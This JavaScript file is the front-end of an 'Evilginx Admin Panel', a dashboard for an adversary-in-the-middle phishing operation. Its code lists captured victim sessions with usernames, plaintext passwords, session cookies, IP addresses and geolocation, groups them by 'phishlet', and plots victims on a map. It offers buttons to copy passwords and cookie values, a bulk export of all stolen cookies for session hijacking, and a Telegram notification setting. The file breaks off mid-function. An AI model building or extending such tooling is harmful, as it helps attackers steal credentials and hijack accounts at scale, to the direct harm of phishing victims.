/**
 * Evilginx Admin Panel - Modern Application
 * Enhanced UI with glassmorphism, real-time updates, and advanced features
 */

// ============================================================
// State Management
// ============================================================
const AppState = {
    currentTab: 'dashboard',
    sessions: [],
    tokens: [],
    selectedSessions: new Set(),
    currentPage: 1,
    pageSize: 25,
    totalSessions: 0,
    sortField: 'id',
    sortOrder: 'desc',
    filters: {
        search: '',
        phishlet: '',
        status: '',
        date: ''
    },
    charts: {},
    map: null,
    mapMarkers: null,
    autoRefreshInterval: null,
    theme: 'dark'
};

// ============================================================
// Toast Notification System
// ============================================================
const Toast = {
    container: document.getElementById('toastContainer'),
    
    success(message, title = 'Success') {
        this.show({ type: 'success', title, message, icon: 'ri-check-line' });
    },
    
    error(message, title = 'Error') {
        this.show({ type: 'error', title, message, icon: 'ri-close-circle-line' });
    },
    
    warning(message, title = 'Warning') {
        this.show({ type: 'warning', title, message, icon: 'ri-alert-line' });
    },
    
    info(message, title = 'Info') {
        this.show({ type: 'info', title, message, icon: 'ri-information-line' });
    },
    
    show({ type, title, message, icon }) {
        const toast = document.createElement('div');
        toast.className = `toast ${type}`;
        toast.innerHTML = `
            <div class="toast-icon"><i class="${icon}"></i></div>
            <div class="toast-content">
                <div class="toast-title">${title}</div>
                <div class="toast-message">${message}</div>
            </div>
            <button class="toast-close" onclick="this.parentElement.remove()">
                <i class="ri-close-line"></i>
            </button>
        `;
        
        this.container.appendChild(toast);
        
        // Auto remove after 5 seconds
        setTimeout(() => {
            toast.style.opacity = '0';
            toast.style.transform = 'translateX(100%)';
            setTimeout(() => toast.remove(), 300);
        }, 5000);
    }
};

// ============================================================
// Utility Functions
// ============================================================
const Utils = {
    formatDate(timestamp) {
        if (!timestamp) return 'N/A';
        const date = new Date(timestamp * 1000);
        return date.toLocaleString();
    },
    
    formatTimeAgo(timestamp) {
        if (!timestamp) return 'N/A';
        const seconds = Math.floor((Date.now() / 1000) - timestamp);
        
        if (seconds < 60) return `${seconds}s ago`;
        if (seconds < 3600) return `${Math.floor(seconds / 60)}m ago`;
        if (seconds < 86400) return `${Math.floor(seconds / 3600)}h ago`;
        return `${Math.floor(seconds / 86400)}d ago`;
    },
    
    truncate(str, length = 50) {
        if (!str) return '';
        return str.length > length ? str.substring(0, length) + '...' : str;
    },
    
    getInitials(email) {
        if (!email) return '?';
        return email.split('@')[0].substring(0, 2).toUpperCase();
    },
    
    copyToClipboard(text) {
        navigator.clipboard.writeText(text).then(() => {
            Toast.success('Copied to clipboard');
        }).catch(() => {
            Toast.error('Failed to copy');
        });
    },
    
    downloadBlob(blob, filename) {
        const url = URL.createObjectURL(blob);
        const link = document.createElement('a');
        link.href = url;
        link.download = filename;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        URL.revokeObjectURL(url);
    },
    
    debounce(func, wait) {
        let timeout;
        return function executedFunction(...args) {
            const later = () => {
                clearTimeout(timeout);
                func(...args);
            };
            clearTimeout(timeout);
            timeout = setTimeout(later, wait);
        };
    }
};

// ============================================================
// Theme Management
// ============================================================
const Theme = {
    init() {
        const savedTheme = localStorage.getItem('theme') || 'dark';
        this.set(savedTheme);
        
        document.getElementById('themeToggle').addEventListener('click', () => {
            const current = document.body.classList.contains('dark') ? 'dark' : 'light';
            this.set(current === 'dark' ? 'light' : 'dark');
        });
    },
    
    set(theme) {
        AppState.theme = theme;
        document.body.classList.remove('light', 'dark');
        document.body.classList.add(theme);
        localStorage.setItem('theme', theme);
        
        const icon = document.getElementById('themeIcon');
        icon.className = theme === 'dark' ? 'ri-sun-line' : 'ri-moon-line';
    }
};

// ============================================================
// Tab Navigation
// ============================================================
function switchTab(tabName) {
    AppState.currentTab = tabName;
    
    // Update nav buttons
    document.querySelectorAll('.nav-btn').forEach(btn => {
        btn.classList.toggle('active', btn.dataset.tab === tabName);
    });
    
    // Update tab content
    document.querySelectorAll('.tab-content').forEach(content => {
        content.classList.toggle('active', content.id === `${tabName}Tab`);
    });
    
    // Tab-specific initialization
    if (tabName === 'sessions') {
        loadSessions();
    } else if (tabName === 'tokens') {
        loadTokens();
    } else if (tabName === 'map') {
        initMap();
    } else if (tabName === 'dashboard') {
        loadDashboard();
    }
}

// ============================================================
// API Functions
// ============================================================
const API = {
    async getSessions() {
        const response = await fetch('/api/sessions');
        if (!response.ok) throw new Error('Failed to load sessions');
        return response.json();
    },
    
    async getSession(id) {
        const response = await fetch(`/api/sessions/${id}`);
        if (!response.ok) throw new Error('Failed to load session');
        return response.json();
    },
    
    async deleteSession(id) {
        const response = await fetch(`/api/sessions/${id}`, { method: 'DELETE' });
        if (!response.ok) throw new Error('Failed to delete session');
        return response.json();
    },
    
    async getSettings() {
        const response = await fetch('/api/settings');
        if (!response.ok) throw new Error('Failed to load settings');
        return response.json();
    },
    
    async saveSettings(settings) {
        const response = await fetch('/api/settings', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(settings)
        });
        if (!response.ok) throw new Error('Failed to save settings');
        return response.json();
    },
    
    async logout() {
        const response = await fetch('/api/auth/logout', { method: 'POST' });
        if (!response.ok) throw new Error('Logout failed');
        window.location.href = '/login';
    }
};

// ============================================================
// Dashboard
// ============================================================
async function loadDashboard() {
    try {
        const sessions = await API.getSessions();
        AppState.sessions = sessions;
        
        // Calculate stats
        const total = sessions.length;
        const active = sessions.filter(s => !s.done).length;
        const today = sessions.filter(s => {
            const sessionDate = new Date(s.create_time * 1000);
            const today = new Date();
            return sessionDate.toDateString() === today.toDateString();
        }).length;
        
        // Count tokens
        let tokenCount = 0;
        sessions.forEach(s => {
            if (s.tokens && s.tokens.cookie) {
                Object.values(s.tokens.cookie).forEach(domain => {
                    tokenCount += Object.keys(domain).length;
                });
            }
        });
        
        // Count unique countries
        const countries = new Set(sessions.map(s => s.geolocation?.country).filter(Boolean));
        
        // Update stats display
        document.getElementById('totalSessions').textContent = total;
        document.getElementById('activeSessions').textContent = active;
        document.getElementById('totalTokens').textContent = tokenCount;
        document.getElementById('uniqueCountries').textContent = countries.size;
        document.getElementById('sessionTrend').textContent = `+${today} today`;
        document.getElementById('tokenTrend').textContent = `+${today * 5} today`; // Estimate
        
        // Update charts
        updateDashboardCharts(sessions);
        
        // Update recent sessions table
        updateRecentSessions(sessions.slice(0, 10));
        
    } catch (error) {
        console.error('Dashboard load error:', error);
        Toast.error('Failed to load dashboard data');
    }
}

function updateDashboardCharts(sessions) {
    // Activity chart - sessions over last 7 days
    const last7Days = Array.from({ length: 7 }, (_, i) => {
        const d = new Date();
        d.setDate(d.getDate() - (6 - i));
        return d.toLocaleDateString('en-US', { weekday: 'short' });
    });
    
    const dailyCounts = last7Days.map((_, i) => {
        const targetDate = new Date();
        targetDate.setDate(targetDate.getDate() - (6 - i));
        return sessions.filter(s => {
            const sessionDate = new Date(s.create_time * 1000);
            return sessionDate.toDateString() === targetDate.toDateString();
        }).length;
    });
    
    const activityCtx = document.getElementById('activityChart');
    if (activityCtx) {
        if (AppState.charts.activity) {
            AppState.charts.activity.destroy();
        }
        
        AppState.charts.activity = new Chart(activityCtx, {
            type: 'line',
            data: {
                labels: last7Days,
                datasets: [{
                    label: 'Sessions',
                    data: dailyCounts,
                    borderColor: '#6366f1',
                    backgroundColor: 'rgba(99, 102, 241, 0.1)',
                    fill: true,
                    tension: 0.4
                }]
            },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                plugins: {
                    legend: { display: false }
                },
                scales: {
                    y: { beginAtZero: true, grid: { color: 'rgba(0,0,0,0.05)' } },
                    x: { grid: { display: false } }
                }
            }
        });
    }
    
    // Phishlet distribution
    const phishletCounts = {};
    sessions.forEach(s => {
        phishletCounts[s.phishlet] = (phishletCounts[s.phishlet] || 0) + 1;
    });
    
    const phishletCtx = document.getElementById('phishletChart');
    if (phishletCtx) {
        if (AppState.charts.phishlet) {
            AppState.charts.phishlet.destroy();
        }
        
        const colors = ['#6366f1', '#8b5cf6', '#06b6d4', '#10b981', '#f59e0b', '#ef4444'];
        
        AppState.charts.phishlet = new Chart(phishletCtx, {
            type: 'doughnut',
            data: {
                labels: Object.keys(phishletCounts),
                datasets: [{
                    data: Object.values(phishletCounts),
                    backgroundColor: colors
                }]
            },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                plugins: {
                    legend: { position: 'right' }
                }
            }
        });
    }
}

function updateRecentSessions(sessions) {
    const tbody = document.getElementById('recentSessionsBody');
    if (!tbody) return;
    
    tbody.innerHTML = sessions.map(session => `
        <tr>
            <td class="cell-id">${Utils.truncate(session.id, 8)}</td>
            <td>
                <div class="cell-user">
                    <div class="user-avatar">${Utils.getInitials(session.username)}</div>
                    <div class="user-info">
                        <span class="user-email">${session.username || 'Unknown'}</span>
                        <span class="user-meta">${session.password ? 'With password' : 'Session only'}</span>
                    </div>
                </div>
            </td>
            <td>${session.phishlet}</td>
            <td>${session.remote_addr}</td>
            <td>
                <span class="cell-status ${session.done ? 'status-completed' : 'status-active'}">
                    <i class="ri-${session.done ? 'checkbox-circle' : 'time'}-fill"></i>
                    ${session.done ? 'Completed' : 'Active'}
                </span>
            </td>
            <td>${Utils.formatTimeAgo(session.create_time)}</td>
            <td>
                <div class="cell-actions">
                    <button class="action-btn" onclick="viewSession('${session.id}')" title="View">
                        <i class="ri-eye-line"></i>
                    </button>
                    <button class="action-btn delete" onclick="deleteSession('${session.id}')" title="Delete">
                        <i class="ri-delete-bin-line"></i>
                    </button>
                </div>
            </td>
        </tr>
    `).join('');
}

// ============================================================
// Sessions Management
// ============================================================
async function loadSessions() {
    try {
        const sessions = await API.getSessions();
        AppState.sessions = sessions;
        AppState.totalSessions = sessions.length;
        
        // Populate phishlet filter
        const phishlets = [...new Set(sessions.map(s => s.phishlet))];
        const filterSelect = document.getElementById('filterPhishlet');
        if (filterSelect) {
            filterSelect.innerHTML = '<option value="">All Phishlets</option>' +
                phishlets.map(p => `<option value="${p}">${p}</option>`).join('');
        }
        
        renderSessionsTable();
    } catch (error) {
        console.error('Sessions load error:', error);
        Toast.error('Failed to load sessions');
    }
}

function filterSessions() {
    let filtered = [...AppState.sessions];
    
    // Search filter
    const search = document.getElementById('sessionSearch')?.value.toLowerCase() || '';
    if (search) {
        filtered = filtered.filter(s => 
            (s.id && s.id.toLowerCase().includes(search)) ||
            (s.username && s.username.toLowerCase().includes(search)) ||
            (s.remote_addr && s.remote_addr.toLowerCase().includes(search))
        );
    }
    
    // Phishlet filter
    const phishlet = document.getElementById('filterPhishlet')?.value || '';
    if (phishlet) {
        filtered = filtered.filter(s => s.phishlet === phishlet);
    }
    
    // Status filter
    const status = document.getElementById('filterStatus')?.value || '';
    if (status) {
        if (status === 'active') filtered = filtered.filter(s => !s.done);
        if (status === 'completed') filtered = filtered.filter(s => s.done);
    }
    
    // Date filter
    const date = document.getElementById('filterDate')?.value || '';
    if (date) {
        const filterDate = new Date(date);
        filtered = filtered.filter(s => {
            const sessionDate = new Date(s.create_time * 1000);
            return sessionDate.toDateString() === filterDate.toDateString();
        });
    }
    
    return filtered;
}

function renderSessionsTable() {
    const filtered = filterSessions();
    const total = filtered.length;
    
    // Sort
    filtered.sort((a, b) => {
        let aVal = a[AppState.sortField];
        let bVal = b[AppState.sortField];
        
        if (AppState.sortField === 'create_time') {
            aVal = aVal || 0;
            bVal = bVal || 0;
        } else {
            aVal = (aVal || '').toString().toLowerCase();
            bVal = (bVal || '').toString().toLowerCase();
        }
        
        if (AppState.sortOrder === 'asc') {
            return aVal > bVal ? 1 : -1;
        }
        return aVal < bVal ? 1 : -1;
    });
    
    // Paginate
    const start = (AppState.currentPage - 1) * AppState.pageSize;
    const end = Math.min(start + AppState.pageSize, total);
    const pageData = filtered.slice(start, end);
    
    // Update pagination info
    document.getElementById('pageStart').textContent = total > 0 ? start + 1 : 0;
    document.getElementById('pageEnd').textContent = end;
    document.getElementById('totalItems').textContent = total;
    
    // Render table
    const tbody = document.getElementById('sessionsBody');
    tbody.innerHTML = pageData.map(session => `
        <tr data-id="${session.id}" class="${AppState.selectedSessions.has(session.id) ? 'selected' : ''}">
            <td><input type="checkbox" ${AppState.selectedSessions.has(session.id) ? 'checked' : ''} 
                onchange="toggleSessionSelection('${session.id}')"></td>
            <td class="cell-id">${Utils.truncate(session.id, 8)}</td>
            <td>
                <div class="cell-user">
                    <div class="user-avatar">${Utils.getInitials(session.username)}</div>
                    <div class="user-info">
                        <span class="user-email">${session.username || 'Unknown'}</span>
                    </div>
                </div>
            </td>
            <td>${session.phishlet}</td>
            <td>
                <div style="display: flex; flex-direction: column;">
                    <span>${session.remote_addr}</span>
                    <span style="font-size: 0.75rem; color: var(--text-light-secondary);">
                        ${session.geolocation?.country || 'Unknown'}
                    </span>
                </div>
            </td>
            <td>
                ${session.tokens ? Object.keys(session.tokens).length : 0}
            </td>
            <td>
                <span class="cell-status ${session.done ? 'status-completed' : 'status-active'}">
                    <i class="ri-${session.done ? 'checkbox-circle' : 'time'}-fill"></i>
                    ${session.done ? 'Completed' : 'Active'}
                </span>
            </td>
            <td>${Utils.formatTimeAgo(session.create_time)}</td>
            <td>
                <div class="cell-actions">
                    <button class="action-btn" onclick="viewSession('${session.id}')" title="View Details">
                        <i class="ri-eye-line"></i>
                    </button>
                    <button class="action-btn" onclick="copySessionJson('${session.id}')" title="Copy JSON">
                        <i class="ri-file-copy-line"></i>
                    </button>
                    <button class="action-btn" onclick="exportSession('${session.id}')" title="Export">
                        <i class="ri-download-2-line"></i>
                    </button>
                    <button class="action-btn delete" onclick="deleteSession('${session.id}')" title="Delete">
                        <i class="ri-delete-bin-line"></i>
                    </button>
                </div>
            </td>
        </tr>
    `).join('');
    
    // Update pagination controls
    renderPagination(Math.ceil(total / AppState.pageSize));
    
    // Update select all checkbox
    const selectAll = document.getElementById('selectAll');
    if (selectAll) {
        selectAll.checked = pageData.length > 0 && pageData.every(s => AppState.selectedSessions.has(s.id));
    }
}

function renderPagination(totalPages) {
    const container = document.getElementById('paginationControls');
    if (!container) return;
    
    let html = '';
    
    // Previous
    html += `<button class="page-btn" ${AppState.currentPage === 1 ? 'disabled' : ''} onclick="goToPage(${AppState.currentPage - 1})">
        <i class="ri-arrow-left-s-line"></i>
    </button>`;
    
    // Page numbers
    const maxButtons = 5;
    let startPage = Math.max(1, AppState.currentPage - Math.floor(maxButtons / 2));
    let endPage = Math.min(totalPages, startPage + maxButtons - 1);
    
    if (endPage - startPage < maxButtons - 1) {
        startPage = Math.max(1, endPage - maxButtons + 1);
    }
    
    if (startPage > 1) {
        html += `<button class="page-btn" onclick="goToPage(1)">1</button>`;
        if (startPage > 2) html += `<span style="padding: 0 8px;">...</span>`;
    }
    
    for (let i = startPage; i <= endPage; i++) {
        html += `<button class="page-btn ${i === AppState.currentPage ? 'active' : ''}" onclick="goToPage(${i})">${i}</button>`;
    }
    
    if (endPage < totalPages) {
        if (endPage < totalPages - 1) html += `<span style="padding: 0 8px;">...</span>`;
        html += `<button class="page-btn" onclick="goToPage(${totalPages})">${totalPages}</button>`;
    }
    
    // Next
    html += `<button class="page-btn" ${AppState.currentPage === totalPages ? 'disabled' : ''} onclick="goToPage(${AppState.currentPage + 1})">
        <i class="ri-arrow-right-s-line"></i>
    </button>`;
    
    container.innerHTML = html;
}

function goToPage(page) {
    AppState.currentPage = page;
    renderSessionsTable();
}

function toggleSessionSelection(id) {
    if (AppState.selectedSessions.has(id)) {
        AppState.selectedSessions.delete(id);
    } else {
        AppState.selectedSessions.add(id);
    }
    updateBulkBar();
    renderSessionsTable();
}

function toggleAllSessions() {
    const filtered = filterSessions();
    const allSelected = filtered.every(s => AppState.selectedSessions.has(s.id));
    
    if (allSelected) {
        filtered.forEach(s => AppState.selectedSessions.delete(s.id));
    } else {
        filtered.forEach(s => AppState.selectedSessions.add(s.id));
    }
    
    updateBulkBar();
    renderSessionsTable();
}

function updateBulkBar() {
    const bar = document.getElementById('bulkBar');
    const count = AppState.selectedSessions.size;
    
    document.getElementById('bulkCount').textContent = count;
    bar.classList.toggle('active', count > 0);
}

function clearSelection() {
    AppState.selectedSessions.clear();
    updateBulkBar();
    renderSessionsTable();
}

async function viewSession(id) {
    try {
        const session = await API.getSession(id);
        showSessionDetail(session);
    } catch (error) {
        Toast.error('Failed to load session details');
    }
}

function showSessionDetail(session) {
    const panel = document.getElementById('detailOverlay');
    const body = document.getElementById('detailPanelBody');
    
    // Format cookies
    let cookiesHtml = '<div class="empty-state" style="padding: 2rem;"><div class="empty-state-icon"><i class="ri-cookie-off-line"></i></div><div class="empty-state-title">No Cookies</div></div>';
    
    if (session.tokens && session.tokens.cookie) {
        const cookieList = [];
        Object.entries(session.tokens.cookie).forEach(([domain, tokens]) => {
            Object.entries(tokens).forEach(([name, cookie]) => {
                cookieList.push({ domain, name, ...cookie });
            });
        });
        
        if (cookieList.length > 0) {
            cookiesHtml = '<div class="cookie-list">' + cookieList.map(cookie => `
                <div class="cookie-item">
                    <div class="cookie-info">
                        <span class="cookie-name">${cookie.name}</span>
                        <span class="cookie-domain">${cookie.domain}</span>
                    </div>
                    <div class="cookie-actions">
                        <button class="action-btn" onclick="Utils.copyToClipboard('${Utils.truncate(cookie.value || '', 100).replace(/'/g, "\\'")}')" title="Copy Value">
                            <i class="ri-file-copy-line"></i>
                        </button>
                    </div>
                </div>
            `).join('') + '</div>';
        }
    }
    
    // Format custom data
    let customDataHtml = '';
    if (session.custom && Object.keys(session.custom).length > 0) {
        customDataHtml = `
            <div class="detail-section">
                <div class="detail-section-title"><i class="ri-database-2-line"></i> Custom Data</div>
                <div class="code-block">
                    <pre>${JSON.stringify(session.custom, null, 2)}</pre>
                    <button class="copy-btn" onclick="Utils.copyToClipboard('${JSON.stringify(session.custom).replace(/'/g, "\\'")}')">
                        <i class="ri-file-copy-line"></i> Copy
                    </button>
                </div>
            </div>
        `;
    }
    
    // Create JSON export
    const exportJson = {
        id: session.id,
        phishlet: session.phishlet,
        username: session.username,
        password: session.password,
        custom: session.custom,
        tokens: session.tokens,
        remote_addr: session.remote_addr,
        user_agent: session.user_agent,
        create_time: session.create_time,
        geolocation: session.geolocation
    };
    
    body.innerHTML = `
        <div class="detail-section">
            <div class="detail-section-title"><i class="ri-user-line"></i> Session Information</div>
            <div class="detail-grid">
                <div class="detail-item">
                    <span class="detail-label">ID</span>
                    <span class="detail-value code">${session.id}</span>
                </div>
                <div class="detail-item">
                    <span class="detail-label">Phishlet</span>
                    <span class="detail-value">${session.phishlet}</span>
                </div>
                <div class="detail-item">
                    <span class="detail-label">Status</span>
                    <span class="detail-value">
                        <span class="cell-status ${session.done ? 'status-completed' : 'status-active'}">
                            ${session.done ? 'Completed' : 'Active'}
                        </span>
                    </span>
                </div>
                <div class="detail-item">
                    <span class="detail-label">Created</span>
                    <span class="detail-value">${Utils.formatDate(session.create_time)}</span>
                </div>
            </div>
        </div>
        
        <div class="detail-section">
            <div class="detail-section-title"><i class="ri-account-circle-line"></i> Credentials</div>
            <div class="detail-grid">
                <div class="detail-item full-width">
                    <span class="detail-label">Username / Email</span>
                    <span class="detail-value">${session.username || 'Not captured'}</span>
                </div>
                <div class="detail-item full-width">
                    <span class="detail-label">Password</span>
                    <div style="display: flex; align-items: center; gap: 0.5rem;">
                        <span class="detail-value code" style="flex: 1;">${session.password || 'Not captured'}</span>
                        ${session.password ? `<button class="btn btn-secondary btn-icon" onclick="Utils.copyToClipboard('${session.password.replace(/'/g, "\\'")}')"><i class="ri-file-copy-line"></i></button>` : ''}
                    </div>
                </div>
            </div>
        </div>
        
        <div class="detail-section">
            <div class="detail-section-title"><i class="ri-map-pin-line"></i> Location & Device</div>
            <div class="detail-grid">
                <div class="detail-item">
                    <span class="detail-label">IP Address</span>
                    <span class="detail-value">${session.remote_addr || 'Unknown'}</span>
                </div>
                <div class="detail-item">
                    <span class="detail-label">Country</span>
                    <span class="detail-value">${session.geolocation?.country || 'Unknown'}</span>
                </div>
                <div class="detail-item">
                    <span class="detail-label">City</span>
                    <span class="detail-value">${session.geolocation?.city || 'Unknown'}</span>
                </div>
                <div class="detail-item">
                    <span class="detail-label">ISP</span>
                    <span class="detail-value">${session.geolocation?.isp || 'Unknown'}</span>
                </div>
            </div>
            <div class="detail-item full-width" style="margin-top: 1rem;">
                <span class="detail-label">User Agent</span>
                <div class="code-block" style="margin-top: 0.5rem;">
                    <pre style="max-height: 100px;">${session.user_agent || 'Unknown'}</pre>
                </div>
            </div>
        </div>
        
        ${customDataHtml}
        
        <div class="detail-section">
            <div class="detail-section-title"><i class="ri-cookie-line"></i> Cookies (${session.tokens?.cookie ? Object.keys(session.tokens.cookie).reduce((acc, d) => acc + Object.keys(session.tokens.cookie[d]).length, 0) : 0})</div>
            ${cookiesHtml}
        </div>
        
        <div class="detail-section">
            <div class="detail-section-title"><i class="ri-code-box-line"></i> Export Data</div>
            <div class="code-block">
                <pre>${JSON.stringify(exportJson, null, 2)}</pre>
                <button class="copy-btn" onclick="Utils.copyToClipboard('${JSON.stringify(exportJson).replace(/'/g, "\\'")}')">
                    <i class="ri-file-copy-line"></i> Copy JSON
                </button>
            </div>
        </div>
    `;
    
    panel.classList.add('active');
    panel.dataset.sessionId = session.id;
}

function closeDetailPanel() {
    document.getElementById('detailOverlay').classList.remove('active');
}

async function deleteSession(id) {
    if (!confirm('Are you sure you want to delete this session?')) return;
    
    try {
        await API.deleteSession(id);
        AppState.sessions = AppState.sessions.filter(s => s.id !== id);
        AppState.selectedSessions.delete(id);
        updateBulkBar();
        renderSessionsTable();
        closeDetailPanel();
        Toast.success('Session deleted');
    } catch (error) {
        Toast.error('Failed to delete session');
    }
}

async function deleteCurrentSession() {
    const id = document.getElementById('detailOverlay').dataset.sessionId;
    if (id) await deleteSession(id);
}

async function deleteSelectedSessions() {
    if (!confirm(`Delete ${AppState.selectedSessions.size} selected sessions?`)) return;
    
    const promises = Array.from(AppState.selectedSessions).map(id => API.deleteSession(id));
    
    try {
        await Promise.all(promises);
        AppState.sessions = AppState.sessions.filter(s => !AppState.selectedSessions.has(s.id));
        AppState.selectedSessions.clear();
        updateBulkBar();
        renderSessionsTable();
        Toast.success('Selected sessions deleted');
    } catch (error) {
        Toast.error('Some sessions failed to delete');
    }
}

function exportSession(id) {
    const session = AppState.sessions.find(s => s.id === id);
    if (!session) return;
    
    const blob = new Blob([JSON.stringify(session, null, 2)], { type: 'application/json' });
    Utils.downloadBlob(blob, `session_${id.substring(0, 8)}_${Date.now()}.json`);
    Toast.success('Session exported');
}

function exportSessionDetail() {
    const id = document.getElementById('detailOverlay').dataset.sessionId;
    if (id) exportSession(id);
}

function exportSelectedSessions() {
    const sessions = AppState.sessions.filter(s => AppState.selectedSessions.has(s.id));
    const blob = new Blob([JSON.stringify(sessions, null, 2)], { type: 'application/json' });
    Utils.downloadBlob(blob, `sessions_export_${Date.now()}.json`);
    Toast.success(`${sessions.length} sessions exported`);
}

function exportAllSessions() {
    const blob = new Blob([JSON.stringify(AppState.sessions, null, 2)], { type: 'application/json' });
    Utils.downloadBlob(blob, `all_sessions_${Date.now()}.json`);
    Toast.success('All sessions exported');
}

function copySessionJson(id) {
    const session = AppState.sessions.find(s => s.id === id);
    if (session) {
        Utils.copyToClipboard(JSON.stringify(session, null, 2));
    }
}

// ============================================================
// Tokens Management
// ============================================================
async function loadTokens() {
    // Aggregate all tokens from sessions
    const tokens = [];
    
    AppState.sessions.forEach(session => {
        if (session.tokens && session.tokens.cookie) {
            Object.entries(session.tokens.cookie).forEach(([domain, domainTokens]) => {
                Object.entries(domainTokens).forEach(([name, cookie]) => {
                    tokens.push({
                        domain,
                        name,
                        ...cookie,
                        sessionId: session.id,
                        sessionUser: session.username
                    });
                });
            });
        }
    });
    
    AppState.tokens = tokens;
    renderTokensTable();
}

function renderTokensTable() {
    const search = document.getElementById('tokenSearch')?.value.toLowerCase() || '';
    const filtered = AppState.tokens.filter(t => 
        t.name.toLowerCase().includes(search) ||
        t.domain.toLowerCase().includes(search) ||
        (t.sessionUser && t.sessionUser.toLowerCase().includes(search))
    );
    
    const tbody = document.getElementById('tokensBody');
    tbody.innerHTML = filtered.map(token => `
        <tr>
            <td class="cell-id">${token.domain}</td>
            <td class="cell-id">${token.name}</td>
            <td><span style="font-family: monospace; font-size: 0.75rem;">${Utils.truncate(token.value, 30)}</span></td>
            <td>${Utils.truncate(token.sessionId, 8)}</td>
            <td>${token.expires ? Utils.formatDate(token.expires) : 'Session'}</td>
            <td>${token.http_only ? '<i class="ri-check-line" style="color: var(--success);"></i>' : '-'}</td>
            <td>${token.secure ? '<i class="ri-check-line" style="color: var(--success);"></i>' : '-'}</td>
            <td>
                <div class="cell-actions">
                    <button class="action-btn" onclick="Utils.copyToClipboard('${Utils.truncate(token.value, 100).replace(/'/g, "\\'")}')" title="Copy Value">
                        <i class="ri-file-copy-line"></i>
                    </button>
                </div>
            </td>
        </tr>
    `).join('');
}

function exportAllCookies() {
    const cookieData = AppState.tokens.map(t => ({
        domain: t.domain,
        name: t.name,
        value: t.value,
        path: t.path || '/',
        expires: t.expires,
        httpOnly: t.http_only,
        secure: t.secure
    }));
    
    const blob = new Blob([JSON.stringify(cookieData, null, 2)], { type: 'application/json' });
    Utils.downloadBlob(blob, `all_cookies_${Date.now()}.json`);
    Toast.success(`${cookieData.length} cookies exported`);
}

// ============================================================
// Map
// ============================================================
function initMap() {
    if (AppState.map) {
        AppState.map.invalidateSize();
        return;
    }
    
    AppState.map = L.map('map').setView([20, 0], 2);
    
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        attribution: '© OpenStreetMap contributors',
        maxZoom: 18
    }).addTo(AppState.map);
    
    AppState.mapMarkers = L.markerClusterGroup();
    AppState.map.addLayer(AppState.mapMarkers);
    
    updateMapMarkers();
}

function updateMapMarkers() {
    if (!AppState.mapMarkers) return;
    
    AppState.mapMarkers.clearLayers();
    
    const markers = [];
    AppState.sessions.forEach(session => {
        if (session.geolocation?.lat && session.geolocation?.lon) {
            const marker = L.marker([session.geolocation.lat, session.geolocation.lon]);
            
            const popup = `
                <div style="min-width: 200px;">
                    <strong>${session.username || 'Unknown'}</strong><br>
                    ${session.phishlet}<br>
                    ${session.remote_addr}<br>
                    ${session.geolocation.city}, ${session.geolocation.country}
                </div>
            `;
            
            marker.bindPopup(popup);
            markers.push(marker);
        }
    });
    
    AppState.mapMarkers.addLayers(markers);
}

function resetMap() {
    if (AppState.map) {
        AppState.map.setView([20, 0], 2);
    }
}

// ============================================================
// Settings
// ============================================================
async function saveTelegramSettings() {
    const settings = {
        telegram: {
            botToken: document.getElementById('telegramToken').value,
            chatId: document.getElementById('telegramChatId').value,
            enabled: document.getElementById('telegramEnabled').checked
        }
    };
    
    try {
        await API.saveSettings(settings);
        Toast.success('Settings saved');
    } catch (error) {
        Toast.error('Failed to save settings');
    }
}

async function changePassword() {
    const current = document.getElementById('currentPassword').value;
    const newPass = document.getElementById('newPassword').value;
    const confirm = document.getElementById('confirmPassword').value;
    
    if (!current || !newPass || !confirm) {
        Toast.error('Please fill all fields');
        return;
    }
    
    if (newPass !== confirm) {
        Toast.error('Passwords do not match');
        return;
    }
    
    try {
        const response = await fetch('/api/auth/change-password', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ old_password: current, new_password: newPass })
        });
        
        if (!response.ok) throw new Error('Change failed');
        
        Toast.success('Password changed successfully');
        document.getElementById('currentPassword').value = '';
        document.getElementById('newPassword').value = '';
        document.getElementById('confirmPassword').value = '';
    } catch (error) {
        Toast.error('Failed to change password');
    }
}

async function loadSettings() {
    try {
        const settings = await API.getSettings();
        if (settings.telegram) {
            document.getElementById('telegramToken').value = settings.telegram.botToken || '';
            document.getElementById('telegramChatId').value = settings.telegram.chatId || '';
            document.getElementById('telegramEnabled').checked = settings.telegram.enabled || false;
        }
    } catch (error) {
        console.error('Settings load error:', error);
    }
}

// ============================================================
// Auto Refresh
// ============================================================
function startAutoRefresh() {
    if (AppState.autoRefreshInterval) {
        clearInterval(AppState.autoRefreshInterval);
    }
    
    const enabled = document.getElementById('autoRefresh')?.checked ?? true;
    if (enabled) {
        AppState.autoRefreshInterval = setInterval(() => {
            if (AppState.currentTab === 'sessions') {
                loadSessions();
            } else if (AppState.currentTab === 'dashboard') {
                loadDashboard();
            }
        }, 30000);
    }
}

function refreshSessions() {
    loadSessions();
    Toast.info('Sessions refreshed');
}

// ============================================================
// Event Listeners
// ============================================================
document.addEventListener('DOMContentLoaded', () => {
    // Initialize theme
    Theme.init();
    
    // Load initial data
    loadDashboard();
    loadSettings();
    
    // Tab navigation
    document.querySelectorAll('.nav-btn').forEach(btn => {
        btn.addEventListener('click', () => switchTab(btn.dataset.tab));
    });
    
    // Search with debounce
    const sessionSearch = document.getElementById('sessionSearch');
    if (sessionSearch) {
        sessionSearch.addEventListener('input', Utils.debounce(() => {
            AppState.currentPage = 1;
            renderSessionsTable();
        }, 300));
    }
    
    const tokenSearch = document.getElementById('tokenSearch');
    if (tokenSearch) {
        tokenSearch.addEventListener('input', Utils.debounce(() => {
            renderTokensTable();
        }, 300));
    }
    
    // Filters
    ['filterPhishlet', 'filterStatus', 'filterDate'].forEach(id => {
        const el = document.getElementById(id);
        if (el) {
            el.addEventListener('change', () => {
                AppState.currentPage = 1;
                renderSessionsTable();
            });
        }
    });
    
    // Select all checkbox
    const selectAll = document.getElementById('selectAll');
    if (selectAll) {
        selectAll.addEventListener('change', toggleAllSessions);
    }
    
    // Refresh button
    document.getElementById('refreshBtn')?.addEventListener('click', () => {
        if (AppState.currentTab === 'sessions') loadSessions();
        else if (AppState.currentTab === 'dashboard') loadDashboard();
    });
    
    // Logout
    document.getElementById('logoutBtn')?.addEventListener('click', () => {
        API.logout();
    });
    
    // Start auto refresh
